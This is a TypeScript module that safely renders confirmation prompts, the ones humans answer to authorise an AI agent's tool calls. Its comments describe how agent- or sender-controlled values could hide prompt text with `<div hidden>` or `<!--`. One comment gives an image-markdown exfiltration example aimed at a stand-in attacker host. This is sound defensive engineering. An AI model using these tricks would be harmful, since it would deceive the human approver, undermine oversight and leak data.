import { Marked } from 'marked';

/**
 * Markdown rendering for CONFIRMATION-PROMPT text — the prompts a human answers
 * to authorise a tool call (`http_request` outbound consent, `api_setup`
 * endpoint ack, `knowledge_delete`, `subjects_merge`, `mail_send`/`mail_reply`,
 * `ask_user`).
 *
 * These prompts interpolate values the agent — or, for `mail_reply`, an
 * arbitrary external sender — controls. Rendering them through the normal chat
 * markdown path let such a value SUPPRESS the rest of the prompt: an unclosed
 * `<div hidden>` re-parents every following line into an invisible container,
 * and a `<!--` swallows them into a comment. Either way the text a human clicks
 * "Yes" to was no longer the text on screen.
 *
 * The boundary here is what marked is allowed to PRODUCE, not what a sanitizer
 * takes away afterwards. That ordering is deliberate: an allowlist at
 * generation time is closed (only these renderers can emit tags), and it is
 * verifiable in a plain node test — whereas DOMPurify needs a real DOM and
 * FAILS OPEN when it doesn't have one (`sanitize()` returns its input
 * unchanged, silently). A guard that can't be exercised by the test suite isn't
 * a guard we should be resting a security property on.
 *
 * Scope, stated honestly: this closes SUPPRESSION. It does not stop a value
 * from adding a plausible-looking FAKE line of its own — that needs the prompt
 * payload to separate system frame from interpolated value, which is a
 * different change (see DEF-confirm-prompt-value-spoofing).
 */

/** Schemes a link inside a prompt may point at. */
const SAFE_LINK_SCHEMES: ReadonlySet<string> = new Set(['http:', 'https:', 'mailto:']);

function escapeHtml(value: string): string {
	return value
		.replace(/&/g, '&amp;')
		.replace(/</g, '&lt;')
		.replace(/>/g, '&gt;')
		.replace(/"/g, '&quot;')
		.replace(/'/g, '&#39;');
}

/**
 * A link target is safe only as an ABSOLUTE url on an allowlisted scheme.
 * `javascript:`, `data:` and `vbscript:` all survive marked untouched (verified
 * against marked 18), and scheme matching has to be case-insensitive —
 * `JaVaScRiPt:` parses just fine. Relative hrefs are refused rather than
 * resolved: a prompt has no meaningful relative target, so anything relative is
 * more likely an attempt to look like a link than a real one.
 */
export function isSafePromptHref(href: string): boolean {
	try {
		// The URL parser lowercases the scheme, so this comparison is
		// case-insensitive without a manual toLowerCase().
		return SAFE_LINK_SCHEMES.has(new URL(href).protocol);
	} catch {
		return false;
	}
}

/**
 * A marked instance private to prompt rendering.
 *
 * It must be its OWN instance: `marked.use()` mutates the shared singleton, so
 * configuring the global would silently re-configure every chat message too.
 *
 * `breaks: true` is a security property here, not typography. The prompts put
 * one field per line separated by single newlines (`**To:** …\n**Subject:** …`).
 * Under marked's default those collapse into one run-on paragraph, which is
 * exactly the condition that makes a fake field easy to blend in. With `breaks`
 * every field keeps its own line, and since the mail previews force each
 * interpolated value through `singleLine()`, a value cannot break out of its
 * line to open a new one.
 */
const promptMarked = new Marked({
	gfm: true,
	breaks: true,
	renderer: {
		/**
		 * Raw HTML — block and inline both arrive here — is rendered as visible
		 * TEXT. This is the line that closes suppression: `<div hidden>` and
		 * `<!--` become characters on screen instead of structure.
		 */
		html(token) {
			return escapeHtml(token.text);
		},

		/**
		 * Unsafe targets degrade to their visible text rather than vanishing.
		 * Dropping the text instead would hand an attacker the very thing this
		 * module exists to prevent — a way to make prompt content disappear.
		 */
		link(token) {
			const text = this.parser.parseInline(token.tokens);
			if (!isSafePromptHref(token.href)) return text;
			const title = token.title ? ` title="${escapeHtml(token.title)}"` : '';
			return `<a href="${escapeHtml(token.href)}"${title} rel="noreferrer noopener" target="_blank">${text}</a>`;
		},

		/**
		 * No `<img>` in a prompt, ever. marked emits a real `<img src=…>`, so
		 * `![](https://attacker/?d=…)` in an attacker-controlled subject would
		 * fire an outbound request the moment the confirmation is DISPLAYED —
		 * a tracking/exfil channel that needs no click at all. The alt text is
		 * kept so nothing silently disappears.
		 */
		image(token) {
			const alt = token.text.trim();
			return escapeHtml(alt.length > 0 ? `[image: ${alt}]` : '[image]');
		},
	},
});

/**
 * Render confirmation-prompt markdown to HTML that is safe to inject.
 *
 * Emits only the tags marked's own renderers produce (paragraphs, emphasis,
 * lists, blockquotes, headings, code, tables, safe links) — no `div`, no
 * `style`, no `hidden`, no comments, no images.
 */
export function renderPromptMarkdown(text: string): string {
	return promptMarked.parse(text, { async: false }) as string;
}
